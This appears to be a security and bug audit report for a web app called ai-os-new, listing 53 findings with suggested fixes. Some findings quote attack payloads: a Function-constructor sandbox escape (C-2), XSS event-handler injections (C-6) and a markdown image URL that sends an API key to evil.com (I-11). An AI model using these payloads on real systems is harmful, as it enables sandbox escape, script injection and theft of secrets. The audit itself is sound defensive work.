```markdown
# AI-OS-NEW

## Security & Bug Audit Report

Full codebase security audit, bug analysis, and vulnerability assessment

| | |
|---|---|
| Repository | github.com/n95887174-source/ai-os-new |
| Date | 2026-06-12 |
| Scope | Full codebase: API routes, frontend, DB layer, WebSocket, DCritical Bugs |
| Critical Bugs | 15 |
| Important Bugs | 20 |
| Minor Bugs | 18 |
| Total Findings | 53 |

---

## Executive Summary

This report presents the results of a comprehensive security and bug audit of the ai-os-new project (SuperAgents OS). The audit was performed from scratch, examining all major subsystems: server-side API routes, authentication mechanisms, frontend React components, client-side state management, database and data access layer, WebSocket/real-time communication, Docker deployment configuration, and cryptographic key management. The analysis identified a total of 53 issues across three severity levels: 15 Critical, 20 Important, and 18 Minor.

The most severe findings include a completely broken Docker deployment due to invalid nginx configuration syntax, a sandbox escape vulnerability where user code can bypass AST validation via new Function(), a WebSocket authentication bypass when SYNC_SECRET is empty, a global window.fetch monkey-patch in the debate API that compromises all HTTP requests, and an XSS vulnerability in the CodeRunner component where a blocklist-based HTML sanitizer can be bypassed. These critical issues represent immediate security risks that should be addressed before any production deployment.

On the data integrity front, the MemoryRepository.upsert() method generates non-deterministic IDs that include crypto.randomUUID(), making every call a fresh insert instead of an update. This causes unbounded growth of duplicate memory records. Additionally, DAL repository caches never invalidate, leading to stale data after imports or cross-tab changes. The ResumableStream module leaks memory by never removing completed or failed stream states.

Among the important findings, the CORS proxy operates without authentication or rate limiting, creating an open relay for API abuse. The sandbox SSRF check is incomplete, allowing access to the 172.17-172.31 private IP range. Webhook signatures from GitHub and Sentry are not verified, enabling false compromise signals that could disable active API keys. Multiple memory leaks exist in React components and stores, including uncleaned event subscriptions, polling intervals, and SpeechRecognition instances.

| Severity | Count | Primary Categories | Risk Level |
|----------|-------|--------------------|-------------|
| CRITICAL | 15 | Security Bypass, Sandbox Escape, XSS, Data Corruption, Deployment Failure | Immediate Action Required |
| IMPORTANT | 20 | SSRF, Missing Auth, Memory Leaks, Race Conditions, Stale Data, Input Validation | Fix Before Production |
| MINOR | 18 | Memory Leaks, Configuration, UX Bugs, Performance, Logic Errors | Address in Next Sprint |

---

## Critical Bugs (15)

### C-1: Nginx Config Uses Shell Variable Syntax - Container Fails to Start

**CRITICAL | Configuration | docker/nginx.conf:41, docker/nginx-ssl.conf:58**

Both nginx configuration files use `proxy_pass ${API_UPSTREAM:-https://api.openrouter.ai};` which is shell/envsubst syntax, not valid nginx syntax. The Dockerfile copies the config directly to `/etc/nginx/conf.d/default.conf` without running envsubst. Nginx will fail to parse this directive and the container will crash on startup. This means the entire Docker deployment is completely non-functional in both development and production profiles. No request can reach the application because the reverse proxy never starts. The error manifests as an nginx configuration test failure during container initialization, preventing any traffic from being served.

**Impact:** Complete deployment failure. The entire Docker setup is non-functional.

**Fix:** Copy config to `/etc/nginx/templates/` instead (nginx-unprivileged auto-runs envsubst on files in that directory), or add an envsubst step to the Dockerfile entrypoint.

---

### C-2: Sandbox Worker - new Function() Bypasses AST Validation

**CRITICAL | Security - Sandbox Escape | src/services/sandbox.worker.ts:191**

The AST validator blocks direct eval, Function, fetch, etc. in the parsed code. However, the code is then executed via `new Function()` with string interpolation. The shadowed variables like `const { fetch, XMLHttpRequest, ... } = {};` are just local const declarations that can be circumvented. A determined attacker can use `(async () => {}).constructor.constructor('return this')()` to access the global scope from within `new Function()`, because async functions still have access to the Function constructor chain. This allows bypassing all sandbox restrictions and accessing the Worker's real fetch, importScripts, or other APIs, potentially exfiltrating data or making unauthorized network requests from the user's browser context.

**Impact:** Sandbox escape - arbitrary code execution in Worker context with network access.

**Fix:** Use a proper JS sandbox like `@aspect-build/sandboxed-worker` or run user code in an iframe with CSP. At minimum, freeze Function and Object constructors before executing user code.

---

### C-3: Sync Server WebSocket Auth Bypass When SYNC_SECRET Is Empty

**CRITICAL | Security - Authentication Bypass | server/sync-server.mjs:125-136**

Line 125 declares `const SYNC_SECRET = process.env.SYNC_SECRET || '';` with a fallback to empty string. Line 129 checks `if (!SYNC_SECRET) { callback(true); return; }` which means if SYNC_SECRET is empty, ALL WebSocket connections are accepted without authentication. While lines 12-16 validate AUTH_TOKEN exists on startup, the redundant SYNC_SECRET variable with its `|| ''` fallback creates a fragile auth bypass path. If the env var is set but empty, or if the code is refactored, WebSocket connections become unauthenticated.

**Impact:** Unauthorized WebSocket access - can receive db_changed notifications and access DB sync data.

**Fix:** Remove the redundant SYNC_SECRET variable. Use AUTH_TOKEN directly in verifyClient with a hard check that the token is non-empty.

---

### C-4: SharedDbChannel WebSocket Cannot Pass Auth Headers - Always Rejected

**CRITICAL | Security / Logic Error | src/kernel/services/storage/sqlite-storage.ts:862-863**

`SharedDbChannel.connectWs()` creates a WebSocket with `new WebSocket(wsUrl)` without passing any authentication. The browser WebSocket API does not support custom headers. The sync-server's verifyClient checks for an Authorization header, which means WebSocket connections will ALWAYS be rejected (401) when SYNC_SECRET is configured. This is the flip side of C-3: either authentication is completely bypassed (empty secret) or completely broken (secret set but no way to pass it). The cross-browser sync feature is fundamentally non-functional when authentication is enabled, and the client enters an infinite reconnection loop every 5 seconds without any user-visible error message.

**Impact:** Cross-browser sync feature is completely broken when authentication is enabled.

**Fix:** Pass auth token as a query parameter and update verifyClient to also check `info.req.url` for the token.

---

### C-5: Debate API - Global window.fetch Monkey-Patch

**CRITICAL | Security - Supply Chain / Integrity | src/kernel/services/debate-api.ts:90-106**

`DebateApiService.installFetchBridge()` permanently replaces `window.fetch` with a monkey-patched version that intercepts all requests to `/api/debates`. This breaks any other code that depends on `window.fetch` behaving normally. The replacement is never restored (no uninstall mechanism). All fetch calls go through this interception, meaning any future API routes starting with `/api/debates` would be silently intercepted. If `handleHttp` throws, the entire app's fetch capability breaks. There is no CORS, auth, or CSRF protection on the intercepted routes. This is a global side-effect that fundamentally compromises the integrity of all HTTP communication in the application, creating a single point of failure that can cascade into complete application unresponsiveness.

**Impact:** Global side-effect that can break all HTTP requests. Silently bypasses normal fetch security.

**Fix:** Remove the global `window.fetch` patch. Use a proper API client/router pattern or Service Worker.

---

### C-6: CodeRunner Sandbox - Blocklist-Based HTML Sanitizer Is Bypassable

**CRITICAL | Security - XSS | src/components/ChatPanel/CodeRunner.tsx:77-95, 13-25**

The `escapeForSrcdoc` function uses a blocklist approach (blocking specific tags like `<script`, `<style`, `<iframe>`), which is inherently bypassable. Event handlers like `<svg onload="...">`, `<img src=x onerror="...">`, `<input onfocus="..." autofocus>`, or `<details ontoggle="..." open>` would all execute JavaScript. An LLM-generated code block could escape the sandbox and execute arbitrary JavaScript in the parent context, potentially stealing API keys stored in localStorage/sessionStorage, performing actions on behalf of the user, or exfiltrating conversation data to an external server. The sandbox attribute `"allow-scripts"` without `"allow-same-origin"` provides some protection, but browser sandbox enforcement bugs and the srcdoc approach still leave attack vectors open.

**Impact:** XSS - LLM-generated code can escape sandbox and execute arbitrary JavaScript.

**Fix:** Switch to an allowlist approach for HTML rendering (only permit safe tags). Add event handler stripping (`on\w+=`) for ALL HTML tags.

---

### C-7: Admin Service - No Authorization on Destructive Operations

**CRITICAL | Security - Missing Authorization | src/kernel/services/admin-service.ts:291-328**

The `AdminService.executeCommand()` method allows executing destructive operations (`reset_metrics`, `clear_cache`, `restart_agent`, `update_settings`, `take_snapshot`) with zero authentication or authorization checks. Similarly, `reloadRuntime()`, `clearLogs()`, and `resetAllStats()` are all exposed without any access control. Any code path that reaches this service can perform admin operations. This means any component in the app, or any XSS attack that injects code, can reset the runtime, clear all logs, modify settings, or restart agents. In the context of an AI operating system where agents manage sensitive operations, this lack of authorization creates a critical attack surface that could be exploited by malicious LLM outputs or compromised agent code.

**Impact:** Any component or XSS attack can reset runtime, clear logs, modify settings, restart agents.

**Fix:** Add an authorization layer - require a session token or admin role check before executing commands.

---

### C-8: Sync Server - Error Messages Leak Internal Details

**CRITICAL | Security - Data Exposure | server/sync-server.mjs:79-82, 107-109**

When `readFileSync` or `writeFileSync` fails, the raw Error object (including filesystem paths, Node.js internals, stack traces) is sent to the client via `res.end(String(err))`. This leaks internal server details including file system paths, operating system information, Node.js version details, and application structure. An attacker can use this information to craft targeted attacks, understand the server architecture, and identify other potential vulnerabilities. In a production environment, this information disclosure provides a reconnaissance advantage that significantly lowers the bar for further exploitation.

**Impact:** Information disclosure - reveals server file paths, OS details, and internal state to attackers.

**Fix:** Log errors server-side, return generic error messages to clients.

---

### C-9: MemoryRepository.upsert() Generates Non-Deterministic IDs - Always Inserts

**CRITICAL | Data Integrity | src/kernel/services/storage/memory-repository.ts:170**

`computeId()` is documented as producing "deterministic IDs" but includes `crypto.randomUUID()` on line 170: `return `mem-${hash}-${crypto.randomUUID()}`;`. Since the ID is always unique, `upsert()` on line 91 calls `this.db.memories.get(id)` which will never find an existing entry, making every call a fresh insert instead of an update. The deduplication promise of upsert is completely broken. Over time, this causes unbounded growth of duplicate memory records with slightly different IDs, consuming increasing amounts of IndexedDB storage and degrading query performance. When the user attempts to update an existing memory, a new copy is created instead, leading to stale data being served alongside newer versions without any way to distinguish which is authoritative.

**Impact:** Memory entries duplicated on every upsert() call instead of updated. Unbounded data growth.

**Fix:** Make `computeId` truly deterministic using a hash of (content, source, type) without `crypto.randomUUID()`.

---

### C-10: Dexie Schema Version 7 Declares chatMessages Table With No Class Property

**CRITICAL | Data Integrity | src/kernel/services/database-service.ts:86-93**

Version 7 declares `chatMessages: 'id, sessionId, role, timestamp, [sessionId+timestamp]'` in the schema but the SuperAgentsDB class has no `chatMessages!: Table<...>` property. Dexie requires the class property to exist for the table to be usable. The table is created in IndexedDB but cannot be accessed through the Dexie API. Later versions (8, 9, 10) don't declare it either, meaning the table was silently dropped but may still exist in user databases, wasting storage space. Any code that tries to access `dexieDb.chatMessages` will get undefined and throw a runtime error, potentially crashing the application if error handling is insufficient.

**Impact:** Orphaned IndexedDB table consuming storage. Runtime crashes if code tries to access chatMessages.

**Fix:** Add the `chatMessages` property and declare it in all subsequent versions, or add an upgrade step that drops the orphaned table.

---

### C-11: debateLiveStore & topologyTraceStore Event Subscriptions Never Cleaned Up

**CRITICAL | Memory Leak | src/stores/debateLiveStore.ts:39-121, src/stores/topologyTraceStore.ts:25-74**

Both zustand stores subscribe to `eventBus.onSafe()` inside the `create()` callback. These subscriptions are created once at module import time and persist for the entire app lifecycle. The `destroy()` method exists but is never called by any component. When the user navigates away from debate/trace views, the subscriptions keep firing, accumulating `agentEvents`, `roundEvents`, and `steps` arrays. Even though they are capped, the constant state updates trigger re-renders for any component still subscribed. In long sessions, this compounds across all stores, gradually consuming more memory and CPU cycles processing events for views the user is no longer viewing. The effect is particularly severe in applications with many real-time events where the event bus can fire hundreds of times per minute.

**Impact:** Continuous memory consumption and wasted CPU processing events for inactive views.

**Fix:** Call `destroy()` in `useEffect` cleanup in consuming components, or move subscriptions inside React hooks with proper cleanup.

---

### C-12: highlightCache in MarkdownRenderer Stores React Element Trees, Grows Unbounded

**CRITICAL | Memory Leak | src/components/ChatPanel/MarkdownRenderer.tsx:211-267**

The module-level `highlightCache` Map stores React element trees keyed by `lang:code`. While LRU eviction is implemented (delete oldest when `>= CACHE_MAX`), the cache stores React element trees (not strings), which are much larger. Each cached entry contains arrays of span and div elements with inline styles. During streaming responses, every chunk creates a new cache key, and the cache can hold up to 500 entries of React element trees, potentially megabytes of retained React fiber nodes. The cache key includes the entire source code as a string, which further increases memory consumption. React element trees in cache prevent garbage collection of associated fibers, creating a compounding memory leak that grows with each streaming response containing code blocks.

**Impact:** Significant memory growth during active chat sessions with code blocks, especially with streaming.

**Fix:** Cache tokenized output objects instead of React elements. Reduce `CACHE_MAX` to approximately 50 entries.

---

### C-13: useChatStore.sendMessage Race Condition - Duplicate Messages

**CRITICAL | Race Condition | src/stores/useChatStore.ts:176-268**

The guard `if (get().isSending) return` at line 177 is an async check-then-act pattern. Between the check and `set({ isSending: true })` on line 186, React's batched state updates can allow a second call to pass the check. The `isSending` flag is set after several async operations (memory search, memory store, workspace context fetch). During those awaits, another `sendMessage` call would pass the guard. This results in duplicate messages being sent to the LLM provider, causing double API costs and a confusing user experience where the same message appears twice in the conversation. The issue is exacerbated on slow networks where the async operations take longer, giving more time for a second call to slip through.

**Impact:** Duplicate messages sent to LLM providers, double API costs, confusing UX.

**Fix:** Set `isSending` synchronously at the very start of the function, before any async operations.

---

### C-14: main.tsx beforeunload Async Handler - Data Loss Risk

**CRITICAL | Memory Leak / Data Loss | src/main.tsx:10-13**

The `beforeunload` handler calls `persistSqliteDb()` which is an async I/O operation. The `beforeunload` event may not wait for it to complete in all browsers - in Safari, `beforeunload` handlers have very limited async support. The `visibilitychange` handler is fine, but the critical data persistence on page close relies on the `beforeunload` event which is unreliable for async operations. This means that when a user closes the browser tab or navigates away, any unsaved SQLite database changes may be lost. The data loss is particularly impactful for chat messages, agent configurations, and key management operations that were performed since the last successful persistence. There is no fallback mechanism to ensure data is persisted before the page unloads.

**Impact:** Data loss on page close if `persistSqliteDb()` has not completed.

**Fix:** Use `navigator.sendBeacon()` or `window.sessionStorage` for critical data. Also listen to `pagehide` event which has better async guarantees.

---

### C-15: Nginx CSP Allows unsafe-inline and unsafe-eval

**CRITICAL | Security - Insecure Defaults | docker/nginx.conf:20**

The Content Security Policy includes `'unsafe-inline'` and `'unsafe-eval'` for script sources, which significantly weakens XSS protection. `unsafe-eval` is particularly dangerous as it allows `eval()` and `new Function()` calls from any inline script. Combined with the XSS vulnerabilities found in CodeRunner (C-6), this CSP configuration provides virtually no protection against script injection attacks. An attacker who can inject a script tag or event handler through any of the identified XSS vectors will have their code execute without CSP blocking it. This effectively negates one of the most important browser-level security mechanisms for preventing cross-site scripting attacks.

**Impact:** XSS attacks that inject script tags or event handlers will execute successfully.

**Fix:** Remove `unsafe-inline` and `unsafe-eval`. Use nonces or hashes for inline scripts. Refactor code to avoid `eval`/`new Function`.

---

## Important Bugs (20)

### I-1: CORS Proxy - Duplicated isPrivateIP + DNS TOCTOU

**IMPORTANT | Security - SSRF | scripts/cors-proxy.mjs:9-64**

The `isPrivateIP` function is defined twice in the same file (lines 9-26 and 44-64), suggesting a merge error. More importantly, `isPrivateHost` does DNS resolution to check for private IPs, creating a TOCTOU vulnerability: the DNS result could change between the check and the actual HTTP request (DNS rebinding attack). The CORS proxy also only supports GET requests implicitly but advertises POST in CORS headers, potentially leaking target URLs in error responses.

---

### I-2: CORS Proxy - No Authentication or Rate Limiting

**IMPORTANT | Security - Missing Auth | scripts/cors-proxy.mjs:76-140**

The CORS proxy on port 3082 has no authentication, no rate limiting, and no request logging. Anyone who can reach port 3082 can make requests to any of the ALLOWED_DOMAINS (openrouter.ai, googleapis.com, etc.) through the proxy. This could be used to abuse API keys, use the proxy as an open relay, or perform denial-of-service attacks against the allowed domains.

---

### I-3: Sync Server - Race Condition in Write Queue

**IMPORTANT | Race Condition | server/sync-server.mjs:86-113**

Two separate data listeners are attached to the request. The first tracks size and destroys the request on overflow; the second collects chunks. When the size limit is exceeded and `req.destroy()` is called, the second listener may have already collected some chunks. The `end` event could still fire with partial data, which would then be written to disk via `writeFileSync`. This creates a race between `req.destroy()` and the `end` handler, potentially corrupting the database file.

---

### I-4: Key Vault - Plaintext API Keys Not Securely Zeroed in Memory

**IMPORTANT | Security - Data Exposure | src/kernel/services/key-management/key-vault.ts:72-93**

The `stripPlaintextKeys` and `purgeKey` methods set the key string to `''` but JavaScript strings are immutable - the old string value remains in memory until garbage collected. The spread operator creates a new object while the old key string remains referenced by the original object until GC. API keys may remain in memory longer than necessary, increasing the window for memory inspection attacks. While JavaScript does not support secure memory zeroing, storing keys in `Uint8Array` or `ArrayBuffer` (which can be zeroed) would be more secure.

---

### I-5: API Key Export Lacks Holistic Integrity Verification

**IMPORTANT | Security - Weak Crypto | src/kernel/services/key-management/key-service.ts:426-428**

The `exportKeys()` method encrypts each key individually using AES-GCM but there is no HMAC or signature over the entire exported blob. An attacker who can modify the exported JSON could swap encrypted keys between entries, replay old encrypted values, or delete individual entries. While AES-GCM provides authenticated encryption per-entry, the lack of holistic integrity checking means the export as a whole is vulnerable to tampering that could cause wrong keys to be used for wrong providers.

---

### I-6: Sandbox SSRF Check Incomplete - 172.17-172.31 Range Not Blocked

**IMPORTANT | Security - SSRF | src/kernel/services/sandbox-service.ts:30-45**

`172.16.*` check only covers 172.16.0.0/16, but the private range is 172.16.0.0/12 (172.16.0.0 - 172.31.255.255). IPs like 172.28.0.1 or 172.31.0.1 would pass the check. The tool-executor's `isPrivateIP` from network.ts correctly handles this with regex `172\.(1[6-9]|2\d|3[01])\.` but the sandbox service has its own incomplete inline check. This creates an SSRF vulnerability where sandboxed code can access private network resources in the 172.17-172.31 IP range.

---

### I-7: Database Service - importFromJson Allows Arbitrary Data Injection

**IMPORTANT | Security - Input Validation | src/kernel/services/database-service.ts:287-336**

The `importFromJson` method accepts arbitrary JSON and writes it directly to database tables. There is no schema validation, size limit on the import payload, rate limiting, or prototype pollution protection (`__proto__`, `constructor`, `prototype`). The `clear()` + `bulkAdd()` pattern means a malicious import can delete all existing data and replace it with attacker-controlled data, potentially enabling stored XSS through crafted content fields.

---

### I-8: Compromise Webhook - No Signature Verification

**IMPORTANT | Security - Missing Auth | src/kernel/services/compromise-webhook-service.ts:61-72**

The `onWebhookRequest` method processes incoming webhook payloads from GitHub and Sentry without verifying their signatures. An attacker could send forged compromise signals, triggering key rotation or compromise alerts for valid API keys. GitHub provides `X-Hub-Signature-256` headers; Sentry provides `sentry-hook-signature`. Neither is validated, allowing any external party to trigger security-sensitive key rotation operations.

---

### I-9: ResumableStream Memory Leak - Completed/Failed Streams Never Removed

**IMPORTANT | Resource Leak | src/llm/streaming/resumable-stream.ts:52-53**

When a stream completes, only `chunkBuffer` is deleted. The `StreamState` remains in the streams map permanently. Failed streams are never cleaned from either map. The `cleanup()` method only runs on `create()` calls and only evicts streams older than 1 hour. Active usage patterns with many short-lived streams accumulate state indefinitely, creating a memory leak proportional to the number of LLM requests made. In long-running sessions, this can cause significant memory growth.

---

### I-10: DAL Repository Caches Never Invalidate - Stale Data

**IMPORTANT | Data Integrity | src/kernel/dal/ (session, key, role, note, memory repositories)**

All five cached repositories load data once and cache it forever (until page reload). No invalidation mechanism exists when data is modified through other paths (`DatabaseService.importFromJson()`, direct Dexie access, cross-tab changes). Only KeyRepository exposes a `clearCache()` method. After data import, reset, or cross-tab changes, the UI shows stale data until the page is refreshed. This creates a confusing user experience where changes appear to be lost.

---

### I-11: MarkdownRenderer Image URLs Enable Tracking Pixel Injection

**IMPORTANT | Security - XSS | src/components/ChatPanel/MarkdownRenderer.tsx:286-297**

The `inlineMarkdown` function renders img tags for any `![alt](https:...)` pattern. While it restricts to `https:` protocol, this allows an LLM to inject tracking pixels or exfiltrate data via image URLs (e.g., `![img](https://evil.com/track?data=stolen-api-key)`). The alt text is also rendered unsanitized, creating a secondary injection vector. An LLM generating markdown with embedded images that include sensitive data in query parameters would leak that data to external servers.

---

### I-12: SettingsPanel Stale Closure in updateSetting

**IMPORTANT | State Management | src/components/SettingsPanel/SettingsPanel.tsx:128-143**

`updateSetting` has `settings` in its dependency array and creates a new object via spread: `{...settings, [key]: val}`. If two rapid setting changes occur, the second call will spread the state from the first render (not the state after the first update), potentially losing the first update. This is a classic stale closure issue that results in lost settings updates when the user changes multiple settings quickly, such as toggling several checkboxes in rapid succession.

---

### I-13: VoiceButton Does Not Clean Up SpeechRecognition on Unmount

**IMPORTANT | Memory Leak | src/components/ChatPanel/VoiceButton.tsx:14-80**

If the component unmounts while `isListening` is true, the SpeechRecognition instance stored in `recognitionRef` is never stopped. The `onresult` and `onend` callbacks may fire after unmount, causing state updates on unmounted components. More critically, the microphone may stay active after navigating away from the chat panel, representing a privacy concern and a resource leak.

---

### I-14: debateService AbortController Never Connected to Calling Component

**IMPORTANT | Resource Leak | src/kernel/services/debate-service.ts:91**

`new AbortController().signal` is created and passed to `adapter.sendMessage`, but the controller itself is immediately discarded. There is no way to abort an in-flight debate message from the UI. If the user navigates away, the request continues consuming resources and the response may arrive after the component unmounts, potentially causing state updates on unmounted components.

---

### I-15: useRoutingIntelligence - Missing AbortController/Unmount Guard

**IMPORTANT | Race Condition | src/bridges/useRoutingIntelligence.ts:184-123**

`setActiveProfile`, `updateActiveProfileWeights`, `startABTest`, and `stopABTest` are all async callbacks that update state after an `await`. If the component unmounts during the await, the state update will be applied to an unmounted component. No `isMountedRef` or abort controller is used, causing React warnings and potential state corruption.

---

### I-16: useAquariumEngine Stale Closure in Animation Loop

**IMPORTANT | Race Condition | src/components/AquariumPanel/hooks/useAquariumEngine.ts:117-222**

The animation `useEffect` calls `setFishes(newFish)` computed from `fishesRef.current` (via `useLatest`). However, `foodRef.current` is mutated directly (line 132), which bypasses React's state model. If React batches updates and a re-render reads food state before the `setFood` call is processed, the ref and state will be out of sync, causing visual glitches where food particles may appear to duplicate or disappear.

---

### I-17: DexieMemoryStore.queryEntries Uses Wrong Index

**IMPORTANT | Performance | src/kernel/services/storage/dexie-storage.ts:72-89**

`queryEntries` orders by `id` instead of using the compound index `[metadata.timestamp]`. Type, before, and after filters are applied in JavaScript after fetching all data. This defeats the purpose of having Dexie indexes. All memory entries are loaded from IndexedDB for every query, regardless of filter selectivity. With large memory stores, this causes noticeable latency.

---

### I-18: Sync Server Uses Synchronous File I/O - Blocks Event Loop

**IMPORTANT | Performance | server/sync-server.mjs:99**

`fs.writeFileSync(DB_FILE, Buffer.concat(chunks))` performs a synchronous write that blocks the Node.js event loop. Even though writes are serialized through `writeQueue`, the synchronous write prevents the server from handling any other requests or WebSocket messages during the write. Under concurrent load, the sync server becomes unresponsive during writes.

---

### I-19: Validation Hooks Silently Allow Invalid Data

**IMPORTANT | Data Integrity | src/kernel/services/database-service.ts:148-184**

Schema validation hooks catch parse errors but only log a warning: `console.warn(...)`. The invalid data is still written to the database. This means schema validation provides no actual data integrity guarantee - it is purely advisory. Corrupt or malformed data can be persisted to IndexedDB, leading to downstream runtime errors when the data is read and expected to match the schema.

---

### I-20: No Rate Limiting on WebSocket Connections in Sync Server

**IMPORTANT | Security | server/sync-server.mjs:126-137**

The WebSocket server has no connection rate limiting. An attacker could rapidly open thousands of WebSocket connections, consuming server resources and potentially causing a denial-of-service. There is no `maxPayload` option, no limit on `wss.clients` size, and no per-IP connection tracking. This makes the sync server vulnerable to resource exhaustion attacks.

---

## Minor Bugs (18)

### M-1: RewindService Interval Never Cleared

**MINOR | Memory Leak | src/kernel/services/rewind-service.ts:59**

`setInterval` return value is not stored, so it can never be cleared. The interval will continue running even if the service is destroyed. There is no `destroy()` method in RewindService to clean up resources.

---

### M-2: Health Service Concurrency Race in checkAll()

**MINOR | Race Condition | src/kernel/services/health-service.ts:117-147**

The `idx++` operation in the worker function is not truly atomic across await boundaries. If `checkKey()` takes a long time, there could be gaps in the results array. The `isRunning` flag prevents concurrent `checkAll()` calls but does not prevent `checkKey()` from being called individually while `checkAll()` is running.

---

### M-3: Sync Server Hardcoded CORS Origins

**MINOR | Configuration | server/sync-server.mjs:17**

The default CORS origin is `http://localhost:5173` (Vite dev server). In production deployments, if `SYNC_ORIGINS` is not set, the sync server will reject requests from the production domain, making the sync feature non-functional in production.

---

### M-4: CORS Proxy Hardcoded Localhost Origin

**MINOR | Configuration | scripts/cors-proxy.mjs:124,132**

The CORS proxy hardcodes `http://localhost:5173` as the allowed origin. This will not work in production or if the dev server uses a different port, making the CORS proxy unusable in non-default development setups.

---

### M-5: Key Store Dev Globals Expose API Key Recovery

**MINOR | Security - Dev-only | src/stores/useKeyStore.ts:8-56**

In development mode, `__fixOpenRouterModels` and `__recoverKeys` are attached to window. While there is a `console.warn`, the `__recoverKeys` function reads raw API keys from old storage. Any browser extension or XSS could call this in dev mode.

---

### M-6: Monitoring Service Partial Init State

**MINOR | Logic Error | src/kernel/services/monitoring-service.ts:34-38**

`emitSnapshot()` is called in `init()` before the interval is set. If `emitSnapshot()` throws, the interval is never created, but the service may be in a partially initialized state with no heartbeat running.

---

### M-7: Tool Executor Web Search Has No Domain Restriction

**MINOR | Security - Input Validation | src/kernel/services/tool-executor.ts:148-159**

The `t-web` and `t-web-search` tools are enabled by default with no `allowedDomains` restriction. Any public HTTPS URL is accessible, which could be used for SSRF-like attacks if the tool is called by an LLM agent with user-controlled input.

---

### M-8: MCP Service Default Servers Use HTTP

**MINOR | Security - Insecure Defaults | src/kernel/services/mcp-service.ts:72-75**

Default MCP server URLs use plain HTTP. The `validateServerUrl` method allows both `http:` and `https:` protocols. For local development this is acceptable, but there is no warning when connecting to an HTTP server that traffic is unencrypted.

---

### M-9: usePoolStatus Compares State With JSON.stringify

**MINOR | Performance / Logic | src/bridges/usePoolStatus.ts:33-35**

`JSON.stringify(prev.quotes) == JSON.stringify(newQuotes)` is used as an equality check. This is both slow (O(n) serialization on every event) and unreliable - key ordering in `JSON.stringify` is not guaranteed for objects.

---

### M-10: LiveWorkspace Event Logs Use Array Index as Key

**MINOR | UX Bug | src/components/LiveCognition/LiveWorkspace.tsx:103**

`logs.map((log, i) => <div key={i}>)` uses array index as key. Since new logs are prepended, every item's index shifts on each new event. React will reconcile incorrectly, causing visual glitches and unnecessary DOM updates.

---

### M-11: App.tsx GlobalErrorBoundary key Causes Full Remount on Navigation

**MINOR | Performance / UX | src/App.tsx:335**

`<GlobalErrorBoundary key={location.pathname}>` means every route change unmounts and remounts the entire error boundary and all its children. This defeats React reconciliation for route transitions, causes a full DOM teardown/rebuild on every navigation, and loses all component state.

---

### M-12: AlertLayer addToast May Fire After Unmount

**MINOR | Memory Leak | src/components/AlertLayer/AlertLayer.tsx:42-54**

The `addToast` callback is stable (empty deps `[]`) and could be called by event handlers that fire after the component unmounts, causing state update on unmounted component warnings.

---

### M-13: useSystemStatus Does Not Handle Async Service Failures

**MINOR | Error Handling | src/stores/useSystemStatus.ts:7-38**

`systemStatusService.getStatus()` is called synchronously in the initializer. If the service throws (e.g., runtime not ready), the error is unhandled and will crash the component with no error boundary at this level, potentially showing a white screen.

---

### M-14: KvRepository.list() Performs Full Table Scan

**MINOR | Performance | src/kernel/dal/data-access-layer.ts:70-74**

`list(prefix?)` loads ALL key-value pairs via `this.db.keyValue.toArray()`, then filters by prefix in JavaScript. This is O(n) in the total number of KV entries with no index utilization, causing performance issues with large KV stores.

---

### M-15: MemoryRepository.search() Is O(n) Linear Scan

**MINOR | Performance | src/kernel/dal/memory-repository.ts:106-121**

The `search()` method iterates over all cached entries performing `content.toLowerCase().includes(lowerQuery)`. For large memory stores, this is extremely slow with no full-text search index or trigram index. Search becomes unusably slow with more than a few hundred entries.

---

### M-16: WebSocket Reconnect Without Exponential Backoff

**MINOR | Resource Leak | src/kernel/services/storage/sqlite-storage.ts:878-880**

On WebSocket disconnect, the reconnect is scheduled with a fixed 5-second delay. There is no exponential backoff. If the sync server is down for an extended period, the client generates a reconnect attempt every 5 seconds indefinitely, causing unnecessary network traffic and CPU usage.

---

### M-17: SecurityService Salt Stored in localStorage

**MINOR | Security | src/kernel/services/security.ts:229,241**

The encryption salt is stored in `sessionStorage` or `localStorage` as plaintext hex. While cryptographic salts do not need to be secret, storing them in web storage means they are accessible to any XSS attack. Combined with encrypted key material in the same storage, an attacker could extract salt + ciphertext for offline brute-force.

---

### M-18: seed.ts Imports From Non-Existent Module Paths

**MINOR | Logic Error | seed.ts:1-2**

The seed file imports from `./src/services/KeyService` and `./src/core/events`. Neither of these paths exists in the current project structure. Running `npx tsx seed.ts` would fail immediately, making the database seeding script non-functional.

---

## Remediation Roadmap

### Phase 1: Immediate (Week 1) - Critical Security Fixes

| Bug ID | Action | Risk | Est. Time |
|--------|--------|------|-----------|
| C-1 | Fix nginx proxy_pass syntax | Deployment is completely broken | 2 hours |
| C-3/C-4 | Fix WebSocket auth (remove SYNC_SECRET bypass + add query param auth) | Auth bypass or broken sync | 4 hours |
| C-2 | Harden sandbox: freeze Function/Object constructors before new Function() | Sandbox escape | 8 hours |
| C-6 | Switch CodeRunner to allowlist-based HTML sanitization | XSS vulnerability | 4 hours |
| C-5 | Remove global window.fetch monkey-patch from debate-api | All HTTP requests compromised | 3 hours |
| C-7 | Add authorization checks to AdminService | Any code can run admin ops | 4 hours |
| C-8 | Return generic error messages from sync server | Info disclosure | 1 hour |
| C-15 | Remove unsafe-inline/unsafe-eval from CSP | XSS execution enabled | 6 hours |

### Phase 2: Short-Term (Week 2-3) - Data Integrity & Memory Leaks

| Bug ID | Action | Risk | Est. Time |
|--------|--------|------|-----------|
| C-9 | Fix computeId() to be truly deterministic | Unbounded memory duplication | 3 hours |
| C-10 | Add chatMessages property or migration to drop it | Runtime crashes / orphaned data | 2 hours |
| C-11 | Add destroy() calls in component useEffect cleanup | Memory leak in event subscriptions | 3 hours |
| C-12 | Cache tokenized output instead of React elements | Memory leak during streaming | 4 hours |
| C-13 | Set isSending synchronously before async operations | Duplicate message sends | 1 hour |
| C-14 | Add pagehide listener + sendBeacon for critical data | Data loss on page close | 2 hours |
| I-9 | Delete StreamState from map when completed/failed | Memory leak in streaming | 2 hours |
| I-10 | Add cache invalidation to all DAL repositories | Stale data after imports | 6 hours |
| I-19 | Make validation hooks throw instead of just warning | Invalid data persisted to DB | 2 hours |

### Phase 3: Medium-Term (Week 4-6) - Security Hardening

| Bug ID | Action | Risk | Est. Time |
|--------|--------|------|-----------|
| I-1/I-2 | Add auth + rate limiting to CORS proxy; fix duplicate isPrivateIP | Open proxy / SSRF | 6 hours |
| I-6 | Use shared isPrivateIP utility in sandbox service | SSRF to 172.17-31 range | 1 hour |
| I-7 | Add schema validation + size limits to importFromJson | Arbitrary data injection | 4 hours |
| I-8 | Verify webhook signatures (GitHub/Sentry) | False compromise signals | 4 hours |
